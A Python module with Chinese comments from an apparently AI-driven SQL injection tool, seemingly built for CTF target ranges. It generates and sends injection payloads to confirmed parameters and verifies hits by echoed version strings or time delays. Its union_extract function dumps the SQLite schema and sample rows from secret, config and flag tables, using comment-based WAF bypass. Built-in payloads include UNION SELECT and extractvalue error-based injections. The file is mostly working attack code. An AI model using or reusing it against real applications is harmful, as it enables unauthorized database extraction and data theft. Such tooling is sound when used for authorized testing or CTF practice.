# -*- coding: utf-8 -*-
"""AI 深挖直发：按已知 DBMS 生成 payload 并直接验证。

背景（2026-10-18）：深挖此前的 `mode=ai` 只是「固定模板布尔自测 → sqlmap」，
`ai.generate_payloads()` 从未在深挖里被调用——AI 不生成 payload，也不直接发请求。
本模块补上闭环：

    已知 DBMS + 已确认注入语境
        → AI 生成候选 payload（无 AI 时按 DBMS 内置模板兜底）
        → SafeHttpClient 直发（限速/审计/授权）
        → 结构化判据（回显特征 / 时间差 / 报错）
        → 返回确认结果与证据

注意：本模块不替代 sqlmap；它是「已知库类型时的快速定向投放」，
结果落证据后仍由 sqlmap 完成完整库表枚举。
"""
from __future__ import annotations

import json
import re

from app.services import ai
from app.services.prober import _build_request, _elapsed, _is_waf_block, _extract_delay

# 回显判据：响应里出现数据库/元数据特征，才认为 payload 真的被执行并回显
_ECHO_RE = re.compile(
    r"(PostgreSQL\s*[\d.]+|MySQL\s*[\d.]+|MariaDB|SQLite\s*[\d.]+|"
    r"information_schema|sqlite_master|pg_catalog|current_database|"
    r"postgres\s*\|\||mysql\s*\|\|)",
    re.I)

# 无 AI 时按 DBMS 兜底（目标是库名/版本，不是 flag）
_BUILTIN_DEEP = {
    # 注意：这里只放通用 DBMS 用法。OORR/AANNDD 这类「单次关键字删除」绕过
    # 属于**应用层过滤**专项技术（见 kb_insights: app_filter_single_pass），
    # 不是真实 WAF 的通用绕过，不能混进通用 payload 池。
    "postgresql": [
        ("union", "1' UNION SELECT current_database(),current_user,version()-- -"),
        ("union", "1 UNION SELECT current_database(),current_user,version()-- -"),
    ],
    "mysql": [
        ("union", "1' UNION SELECT database(),user(),version()-- -"),
        ("error", "1' AND extractvalue(1,concat(0x7e,database()))-- -"),
    ],
    "sqlite": [
        ("union", "1' UNION SELECT sqlite_version(),sqlite_version(),sqlite_version()-- -"),
    ],
}


def _builtin_for(known_dbms: str) -> list[dict]:
    key = (known_dbms or "").lower()
    for name, items in _BUILTIN_DEEP.items():
        if name in key or (name == "postgresql" and "postgres" in key):
            return [{"payload": p, "vector": v, "false_variant": None,
                     "expected_criteria": "回显库名/版本"} for v, p in items]
    return []


def _strip_html(text: str, payload: str = "") -> str:
    text = text.replace(payload, "") if payload else text
    text = re.sub(r"<style.*?</style>", " ", text, flags=re.S | re.I)
    text = re.sub(r"<script.*?</script>", " ", text, flags=re.S | re.I)
    text = re.sub(r"<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text)


def _parse_samples(text: str, max_rows: int = 5) -> list[dict]:
    """把回显里的 `key::value,...` 解析成结构化数组。

    值本身可能含逗号，所以不能用 `split(",")`：用「下一个 ,key:: 或结尾」做边界。
    无 key:: 形态时退回按逗号/分号切分，包成 [{"value": ...}]。
    """
    text = (text or "").strip()
    if not text:
        return []
    items: list[dict] = []
    for m in re.finditer(
            r"(?P<key>[A-Za-z_][\w-]{0,40})::(?P<val>.*?)"
            r"(?=,\s*[A-Za-z_][\w-]{0,40}::|$)", text, re.S):
        val = m.group("val").strip().strip(",;")
        if val:
            items.append({m.group("key"): val})
        if len(items) >= max_rows:
            break
    if items:
        return items
    parts = [p.strip() for p in re.split(r"[,;\n]", text) if p.strip()]
    return [{"value": p} for p in parts[:max_rows]]


def parse_sqlite_columns(schema_text: str) -> dict[str, list[str]]:
    """从 sqlite_master.sql 的 CREATE TABLE 原文解析 {表名: [列名...]}。

    注意：回显通常是 JSON（`{"data":[[1,"CREATE TABLE ...\\n id INTEGER...",3,4]]}`），
    其中的换行是字面量 `\\n`。旧实现按真实空白解析 → 一个列名都解析不出来，
    于是取样例时退化成 `title||'::'||content`，在 system_config 上直接报错。
    """
    s = (schema_text or "")
    s = s.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\t", " ")
    s = s.replace('\\"', '"')
    out: dict[str, list[str]] = {}
    for tname, body in re.findall(
            r"CREATE TABLE\s+[`\"']?(\w+)[`\"']?\s*\(([\s\S]*?)\)"
            r"(?=\s*(?:;|,|\"|$))",
            s, re.I):
        cols = re.findall(
            r"(?:^|,)\s*[`\"']?(\w+)[`\"']?\s+"
            r"(?:TEXT|INTEGER|INT|REAL|BLOB|NUMERIC|VARCHAR|CHAR|BOOLEAN|"
            r"DATETIME|TIMESTAMP|DATE|DOUBLE|FLOAT|DECIMAL)",
            body, re.I)
        if cols:
            out[tname] = cols
    return out


def union_extract(client, endpoint, param: str, payload_hint: str,
                  *, max_rows: int = 5) -> dict:
    """用已确认的 UNION 回显形态提取表结构与样例数据（SQLite 优先）。

    49920 实测：扫描阶段已命中 UNION 回显（sqlite_version 3.40.1），但深挖只走
    sqlmap（tamper 与该 WAF 不兼容）。这里复用已确认 payload 的绕过形态，
    直接构造 `UNION SELECT 1,(子查询),3,4--` 提取 sqlite_master / 样例数据。
    """
    out = {"tables": [], "schema": "", "samples": [], "samples_text": "",
           "payloads": [], "requests": 0, "error": None}
    if not payload_hint:
        out["error"] = "no payload hint"
        return out
    m = re.match(r"^([^\s/]*')", payload_hint)
    prefix = m.group(1) if m else "1'"
    slash = "/**/" in payload_hint

    def _build(sql: str) -> str:
        raw = f"{prefix} union select 1,({sql}),3,4-- -"
        return ai._apply_strategy(raw, "space_comment") if slash else raw

    def _send(sql: str) -> str | None:
        payload = _build(sql)
        url, params, data = _build_request(endpoint, param, payload)
        try:
            resp = client.request(endpoint.method, url, params=params,
                                  data=data, payload=payload)
        except Exception as exc:
            out["error"] = str(exc)
            return None
        out["requests"] += 1
        out["payloads"].append(payload)
        if _is_waf_block(resp):
            return None
        text = resp.text or ""
        # 应用层错误信封（`{"msg":...,"status":"error"}`）不是回显：
        # 旧实现把它当样例文本，还会被解析成 samples。
        try:
            obj = json.loads(text)
            if isinstance(obj, dict) and str(obj.get("status", "")).lower() == "error":
                return None
        except Exception:
            pass
        return _strip_html(text, payload)

    schema_text = _send("select group_concat(sql) from sqlite_master")
    if schema_text:
        out["schema"] = schema_text[:3000]
        out["tables"] = re.findall(r"CREATE TABLE\s+[`\"']?(\w+)", schema_text, re.I)

    if not out["tables"]:
        names_text = _send("select group_concat(name) from sqlite_master")
        if names_text:
            noise = {
                "select", "union", "from", "where", "group_concat", "sqlite_master",
                "sqlite_version", "have", "error", "syntax", "near", "the", "manual",
                "check", "your", "mysql", "server", "version", "welcome", "nbsp",
                "dhakkan", "less", "based", "intiger", "string", "page", "html",
                "body", "table", "name", "result", "results",
            }
            cand = re.findall(r"\b([a-z][a-z0-9_]{1,40})\b", names_text.lower())
            out["tables"] = [t for t in cand if t not in noise][:20]

    # 解析每张表的列名（SQLite 的 sqlite_master.sql 里就是 CREATE TABLE 原文）。
    # 2026-10-22 某靶场 实测：flag 在 system_config(config_key,config_value)，
    # 旧逻辑只认 secrets/flag 表名 → 拿到了表名却读不到值。
    tbl_cols = parse_sqlite_columns(schema_text or "")

    # 取样例数据：优先 secrets/flag/config 类表；按列拼接 group_concat。
    _PRIORITY = ("flag", "flags", "secret", "secrets", "system_config",
                 "config", "configuration", "settings", "dynamic_keys",
                 "intermediate_info", "archives")
    ranked = sorted(
        out["tables"],
        key=lambda t: (_PRIORITY.index(t.lower())
                       if t.lower() in _PRIORITY else len(_PRIORITY)))
    for sensitive in ranked[:2]:
        cols = tbl_cols.get(sensitive) or []
        if cols:
            expr = "||'::'||".join(cols[:4])
            data_text = _send(f"select group_concat({expr}) from {sensitive}")
        else:
            data_text = _send(
                f"select group_concat(title||'::'||content) from {sensitive}")
            if not data_text:
                data_text = _send(f"select group_concat(content) from {sensitive}")
        if data_text:
            out["samples_text"] = (out["samples_text"] + "\n" + data_text)[:4000]
            out["samples"] = _parse_samples(data_text, max_rows)
            _mf = re.search(r"flag\{[^}]+\}", data_text, re.I)
            if _mf:
                out["flag"] = _mf.group(0)
                break
    return out


def ai_deep_probe(db, endpoint, client, *, param: str, base_value: str = "1",
                  known_dbms: str = "", payload_hint: str | None = None,
                  strategies: list[str] | None = None,
                  max_payloads: int = 5) -> dict:
    """生成并直发 payload，返回 {confirmed, hits, dbms, requests, error}。"""
    probe_ctx = {
        "likely_dbms": (known_dbms or "unknown").lower(),
        "probes": [{
            "param": param, "label": "confirmed",
            "sql_error_like": bool(payload_hint),
            "snippet": (payload_hint or "")[:300],
        }],
    }
    payloads = ai.generate_payloads(db, endpoint, None, strategies=strategies,
                                    base_value=base_value, probe_context=probe_ctx)
    if not payloads:
        payloads = _builtin_for(known_dbms)

    hits: list[dict] = []
    requests = 0
    error = None
    for p in payloads[:max_payloads]:
        payload = str(p.get("payload") or "").strip()
        if not payload:
            continue
        vector = p.get("vector", "boolean")
        url, params, data = _build_request(endpoint, param, payload)
        try:
            resp = client.request(endpoint.method, url, params=params, data=data,
                                  payload=payload)
            elapsed = _elapsed(client)
        except Exception as exc:
            error = str(exc)
            continue
        requests += 1
        if _is_waf_block(resp):
            continue
        text = (resp.text or "")[:8000]
        # 排除「payload 被页面回显」造成的自命中：搜索页常把查询词原样渲染回来，
        # payload 自身含 sqlite_master / information_schema 时会让回显判据假阳性。
        scan_text = text.replace(payload, "") if payload else text

        # 判据 1：回显特征（库名/版本/元数据）
        m = _ECHO_RE.search(scan_text)
        if m:
            hits.append({"payload": payload, "vector": vector,
                         "criteria": f"回显命中: {m.group(0)[:60]}",
                         "elapsed_ms": int(elapsed * 1000)})
            continue

        # 判据 2：时间盲注（payload 里的 sleep 秒数）
        if vector == "time":
            sec = _extract_delay(payload, 5)
            if elapsed >= max(0.8, sec * 0.6):
                hits.append({"payload": payload, "vector": "time",
                             "criteria": f"时间盲注延迟 {elapsed:.2f}s（预期 {sec}s）",
                             "elapsed_ms": int(elapsed * 1000)})

    return {"confirmed": bool(hits), "hits": hits, "dbms": known_dbms or None,
            "requests": requests, "error": error}
